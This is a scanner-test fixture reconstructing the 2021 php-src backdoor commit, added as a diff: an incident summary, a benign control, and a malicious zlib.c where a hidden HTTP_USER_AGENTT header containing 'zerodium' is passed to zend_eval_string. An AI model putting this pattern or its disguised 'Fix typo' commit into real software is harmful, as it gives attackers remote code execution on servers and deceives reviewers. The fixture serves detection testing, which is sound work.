@@ -1,0 +1,374 @@
+# Defanged reconstruction of a real malicious change, for scanner tests.
+# Never run. See internal/e2e/livescan/corpus.go.
+id: php-src-zerodium
+title: "php/php-src (PHP): '[skip-ci] Fix typo' commit in Rasmus Lerdorf's name adds a User-Agentt eval backdoor"
+campaign: php-git-compromise-2021
+date: "2021-03-28"
+kind: git-commit
+ecosystem: git
+name: php/php-src
+version: "c730aa26"
+benignVersion: "92aeda52"
+summary: >-
+  On 2021-03-28 two commits were pushed to the master branch of php/php-src
+  (PHP 8.1-dev) on PHP's self-hosted git.php.net. The first, c730aa26 at 03:57
+  UTC (parent 92aeda52), was authored and committed as Rasmus Lerdorf with the
+  title "[skip-ci] Fix typo", the body "Fixes minor typo." and a Signed-off-by
+  line for him. Nikita Popov caught it in routine post-commit review within
+  hours, reverted it at 09:16 UTC ("This looks like the result of a
+  compromised git account") and revoked Rasmus's commit access. At 16:15 UTC a
+  second commit, 2b0f239b, appeared in Nikita Popov's own name as Revert
+  "Revert "[skip-ci] Fix typo"" and re-applied the change; Levi Morrison
+  reverted it at 17:53 UTC. Both added the same 11 lines to
+  php_zlib_output_compression_start() in ext/zlib/zlib.c: if the $_SERVER
+  entry HTTP_USER_AGENTT (a request header named User-Agentt, with a doubled t
+  so that a real User-Agent never matched) contained the string "zerodium",
+  the value without its first eight characters was passed to zend_eval_string()
+  as PHP code, under the name "REMOVETHIS: sold to zerodium, mid 2017" -
+  remote code execution on any server running that tree. The commits were on
+  master only and no PHP release carried them. PHP first took the pushes for a
+  compromise of the git.php.net server, because they had bypassed its
+  gitolite; its April 6 update withdrew that: the logs show HTTPS pushes
+  through git-http-backend behind Apache Digest authentication against the
+  master.php.net user database, authenticated as the accounts rasmus and nikic
+  after about ten failed attempts, and that database, which kept unsalted MD5
+  password hashes, may have leaked. git.php.net was retired, GitHub became the
+  canonical host and every php.net password was reset. The attacker is
+  unidentified; Zerodium's CEO said the company had nothing to do with it.
+techniques: [git-server-compromise, identity-spoofing, innocuous-commit-message, forged-signoff, backdoor, magic-string-trigger, eval-of-request-data]
+reconstruction: >-
+  The repository is a small stand-in for php-src: ext/zlib/zlib.c keeps the
+  function the real commits changed, php_zlib_output_compression_start(), the
+  neighbouring php_zlib_output_encoding() that reads HTTP_ACCEPT_ENCODING from
+  $_SERVER, and the RINIT hook, with php_zlib.h and a README; it is a fragment
+  and cannot be built. The attacker's commit adds the 11 lines as the GitHub
+  commit view shows them (indentation set to the file's tabs) - a lookup of
+  HTTP_USER_AGENTT in the _SERVER array, strstr for "zerodium",
+  zend_eval_string on the string from its ninth character with the name
+  "REMOVETHIS: sold to zerodium, mid 2017", inside zend_try - at the same
+  place in the same function, with the real title and body, Signed-off-by line
+  included, under the impersonated author's name. What changes: the e-mail
+  addresses are defanged (example.invalid); the suite fixes the author dates,
+  so the commit has a hash of its own; the second commit (the Revert of the
+  Revert under Nikita Popov's name, the same 11 lines) is not modelled; and the
+  control is an invented typo fix in a comment of the same file, under the same
+  kind of title, by an invented author, so that the title alone cannot decide
+  the verdict.
+references:
+  - https://news-web.php.net/php.internals/113838
+  - https://externals.io/message/113981
+  - https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
+  - https://github.com/php/php-src/commit/046827a7e867bb0e655923c75c25a20d06e3aa8b
+  - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
+  - https://php.watch/news/2021/03/git-php-net-hack
+  - https://php.watch/news/news/2021/04/php-src-attack
+  - https://www.bleepingcomputer.com/news/security/phps-git-server-hacked-to-add-backdoors-to-php-source-code/
+  - https://www.csoonline.com/article/3613593/php-backdoor-attempt-shows-need-for-better-code-authenticity-verification.html
+# Not "zerodium": the suite names the watched repository after the sample id, so
+# the word is in every commit prompt (the Repository line), the control's too.
+indicators:
+  - HTTP_USER_AGENTT
+  - REMOVETHIS
+commit:
+  repository: php/php-src
+  author: Sam Maintainer <sam@example.invalid>
+  maliciousAuthor: Rasmus Lerdorf <rasmus@example.invalid>
+  baseMessage: "Merge branch 'PHP-8.0'"
+  benignMessage: "[skip-ci] Fix typo in a comment"
+  maliciousMessage: "[skip-ci] Fix typo\n\nFixes minor typo.\n\nSigned-off-by: Rasmus Lerdorf <rasmus@example.invalid>"
+-- shared/README.md --
+# The PHP Interpreter
+
+PHP is a popular general-purpose scripting language that is especially suited to
+web development. Fast, flexible and pragmatic, PHP powers everything from your
+blog to the most popular websites in the world.
+
+## Source code
+
+The source of PHP lives at [github.com/php/php-src](https://github.com/php/php-src).
+-- shared/ext/zlib/php_zlib.h --
+#ifndef PHP_ZLIB_H
+#define PHP_ZLIB_H
+
+#include "zend_smart_str.h"
+#include "php_output.h"
+#include <zlib.h>
+
+#define PHP_ZLIB_OUTPUT_HANDLER_NAME "zlib output compression"
+#define PHP_ZLIB_ENCODING_GZIP 0x1f
+#define PHP_ZLIB_ENCODING_DEFLATE 0x0f
+
+ZEND_BEGIN_MODULE_GLOBALS(zlib)
+	int compression_coding;
+	zend_long output_compression;
+	zend_long output_compression_default;
+	char *output_handler;
+	bool handler_registered;
+ZEND_END_MODULE_GLOBALS(zlib)
+
+#define ZLIBG(v) ZEND_MODULE_GLOBALS_ACCESSOR(zlib, v)
+
+#endif /* PHP_ZLIB_H */
+-- shared/ext/zlib/zlib.c --
+/*
+   +----------------------------------------------------------------------+
+   | Copyright (c) The PHP Group                                          |
+   +----------------------------------------------------------------------+
+   | This source file is subject to version 3.01 of the PHP license,      |
+   | that is bundled with this package in the file LICENSE.               |
+   +----------------------------------------------------------------------+
+*/
+
+#ifdef HAVE_CONFIG_H
+# include "config.h"
+#endif
+
+#include "php.h"
+#include "SAPI.h"
+#include "php_ini.h"
+#include "ext/standard/info.h"
+#include "php_zlib.h"
+
+ZEND_DECLARE_MODULE_GLOBALS(zlib)
+
+/* {{{ php_zlib_output_encoding */
+static int php_zlib_output_encoding(void)
+{
+	zval *enc;
+
+	/* the coding is settled once per request, by the first Accept-Encoding header we recieve */
+	if (!ZLIBG(compression_coding)) {
+		if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+			(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_ACCEPT_ENCODING", sizeof("HTTP_ACCEPT_ENCODING") - 1))) {
+			convert_to_string(enc);
+			if (strstr(Z_STRVAL_P(enc), "gzip")) {
+				ZLIBG(compression_coding) = PHP_ZLIB_ENCODING_GZIP;
+			} else if (strstr(Z_STRVAL_P(enc), "deflate")) {
+				ZLIBG(compression_coding) = PHP_ZLIB_ENCODING_DEFLATE;
+			}
+		}
+	}
+	return ZLIBG(compression_coding);
+}
+/* }}} */
+
+/* {{{ php_zlib_output_compression_start */
+static void php_zlib_output_compression_start(void)
+{
+	zval zoh;
+	php_output_handler *h;
+
+	switch (ZLIBG(output_compression)) {
+		case 0:
+			break;
+		case 1:
+			ZLIBG(output_compression) = PHP_OUTPUT_HANDLER_DEFAULT_SIZE;
+			ZEND_FALLTHROUGH;
+		default:
+			if (
+				php_zlib_output_encoding() &&
+				(h = php_zlib_output_handler_init(ZEND_STRL(PHP_ZLIB_OUTPUT_HANDLER_NAME), ZLIBG(output_compression), PHP_OUTPUT_HANDLER_STDFLAGS)) &&
+				(SUCCESS == php_output_handler_start(h))
+			) {
+				if (ZLIBG(output_handler) && *ZLIBG(output_handler)) {
+					ZVAL_STRING(&zoh, ZLIBG(output_handler));
+					php_output_start_user(&zoh, ZLIBG(output_compression), PHP_OUTPUT_HANDLER_STDFLAGS);
+					zval_ptr_dtor(&zoh);
+				}
+			}
+			break;
+	}
+}
+/* }}} */
+
+/* {{{ PHP_RINIT_FUNCTION */
+static PHP_RINIT_FUNCTION(zlib)
+{
+	ZLIBG(compression_coding) = 0;
+	if (!ZLIBG(handler_registered)) {
+		ZLIBG(output_compression) = ZLIBG(output_compression_default);
+		php_zlib_output_compression_start();
+	}
+
+	return SUCCESS;
+}
+/* }}} */
+-- benign/ext/zlib/zlib.c --
+/*
+   +----------------------------------------------------------------------+
+   | Copyright (c) The PHP Group                                          |
+   +----------------------------------------------------------------------+
+   | This source file is subject to version 3.01 of the PHP license,      |
+   | that is bundled with this package in the file LICENSE.               |
+   +----------------------------------------------------------------------+
+*/
+
+#ifdef HAVE_CONFIG_H
+# include "config.h"
+#endif
+
+#include "php.h"
+#include "SAPI.h"
+#include "php_ini.h"
+#include "ext/standard/info.h"
+#include "php_zlib.h"
+
+ZEND_DECLARE_MODULE_GLOBALS(zlib)
+
+/* {{{ php_zlib_output_encoding */
+static int php_zlib_output_encoding(void)
+{
+	zval *enc;
+
+	/* the coding is settled once per request, by the first Accept-Encoding header we receive */
+	if (!ZLIBG(compression_coding)) {
+		if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+			(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_ACCEPT_ENCODING", sizeof("HTTP_ACCEPT_ENCODING") - 1))) {
+			convert_to_string(enc);
+			if (strstr(Z_STRVAL_P(enc), "gzip")) {
+				ZLIBG(compression_coding) = PHP_ZLIB_ENCODING_GZIP;
+			} else if (strstr(Z_STRVAL_P(enc), "deflate")) {
+				ZLIBG(compression_coding) = PHP_ZLIB_ENCODING_DEFLATE;
+			}
+		}
+	}
+	return ZLIBG(compression_coding);
+}
+/* }}} */
+
+/* {{{ php_zlib_output_compression_start */
+static void php_zlib_output_compression_start(void)
+{
+	zval zoh;
+	php_output_handler *h;
+
+	switch (ZLIBG(output_compression)) {
+		case 0:
+			break;
+		case 1:
+			ZLIBG(output_compression) = PHP_OUTPUT_HANDLER_DEFAULT_SIZE;
+			ZEND_FALLTHROUGH;
+		default:
+			if (
+				php_zlib_output_encoding() &&
+				(h = php_zlib_output_handler_init(ZEND_STRL(PHP_ZLIB_OUTPUT_HANDLER_NAME), ZLIBG(output_compression), PHP_OUTPUT_HANDLER_STDFLAGS)) &&
+				(SUCCESS == php_output_handler_start(h))
+			) {
+				if (ZLIBG(output_handler) && *ZLIBG(output_handler)) {
+					ZVAL_STRING(&zoh, ZLIBG(output_handler));
+					php_output_start_user(&zoh, ZLIBG(output_compression), PHP_OUTPUT_HANDLER_STDFLAGS);
+					zval_ptr_dtor(&zoh);
+				}
+			}
+			break;
+	}
+}
+/* }}} */
+
+/* {{{ PHP_RINIT_FUNCTION */
+static PHP_RINIT_FUNCTION(zlib)
+{
+	ZLIBG(compression_coding) = 0;
+	if (!ZLIBG(handler_registered)) {
+		ZLIBG(output_compression) = ZLIBG(output_compression_default);
+		php_zlib_output_compression_start();
+	}
+
+	return SUCCESS;
+}
+/* }}} */
+-- malicious/ext/zlib/zlib.c --
+/*
+   +----------------------------------------------------------------------+
+   | Copyright (c) The PHP Group                                          |
+   +----------------------------------------------------------------------+
+   | This source file is subject to version 3.01 of the PHP license,      |
+   | that is bundled with this package in the file LICENSE.               |
+   +----------------------------------------------------------------------+
+*/
+
+#ifdef HAVE_CONFIG_H
+# include "config.h"
+#endif
+
+#include "php.h"
+#include "SAPI.h"
+#include "php_ini.h"
+#include "ext/standard/info.h"
+#include "php_zlib.h"
+
+ZEND_DECLARE_MODULE_GLOBALS(zlib)
+
+/* {{{ php_zlib_output_encoding */
+static int php_zlib_output_encoding(void)
+{
+	zval *enc;
+
+	/* the coding is settled once per request, by the first Accept-Encoding header we receive */
+	if (!ZLIBG(compression_coding)) {
+		if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+			(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_ACCEPT_ENCODING", sizeof("HTTP_ACCEPT_ENCODING") - 1))) {
+			convert_to_string(enc);
+			if (strstr(Z_STRVAL_P(enc), "gzip")) {
+				ZLIBG(compression_coding) = PHP_ZLIB_ENCODING_GZIP;
+			} else if (strstr(Z_STRVAL_P(enc), "deflate")) {
+				ZLIBG(compression_coding) = PHP_ZLIB_ENCODING_DEFLATE;
+			}
+		}
+	}
+	return ZLIBG(compression_coding);
+}
+/* }}} */
+
+/* {{{ php_zlib_output_compression_start */
+static void php_zlib_output_compression_start(void)
+{
+	zval zoh;
+	php_output_handler *h;
+
+	zval *enc;
+
+	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
+		convert_to_string(enc);
+		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
+			zend_try {
+				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+			} zend_end_try();
+		}
+	}
+	switch (ZLIBG(output_compression)) {
+		case 0:
+			break;
+		case 1:
+			ZLIBG(output_compression) = PHP_OUTPUT_HANDLER_DEFAULT_SIZE;
+			ZEND_FALLTHROUGH;
+		default:
+			if (
+				php_zlib_output_encoding() &&
+				(h = php_zlib_output_handler_init(ZEND_STRL(PHP_ZLIB_OUTPUT_HANDLER_NAME), ZLIBG(output_compression), PHP_OUTPUT_HANDLER_STDFLAGS)) &&
+				(SUCCESS == php_output_handler_start(h))
+			) {
+				if (ZLIBG(output_handler) && *ZLIBG(output_handler)) {
+					ZVAL_STRING(&zoh, ZLIBG(output_handler));
+					php_output_start_user(&zoh, ZLIBG(output_compression), PHP_OUTPUT_HANDLER_STDFLAGS);
+					zval_ptr_dtor(&zoh);
+				}
+			}
+			break;
+	}
+}
+/* }}} */
+
+/* {{{ PHP_RINIT_FUNCTION */
+static PHP_RINIT_FUNCTION(zlib)
+{
+	ZLIBG(compression_coding) = 0;
+	if (!ZLIBG(handler_registered)) {
+		ZLIBG(output_compression) = ZLIBG(output_compression_default);
+		php_zlib_output_compression_start();
+	}
+
+	return SUCCESS;
+}
+/* }}} */
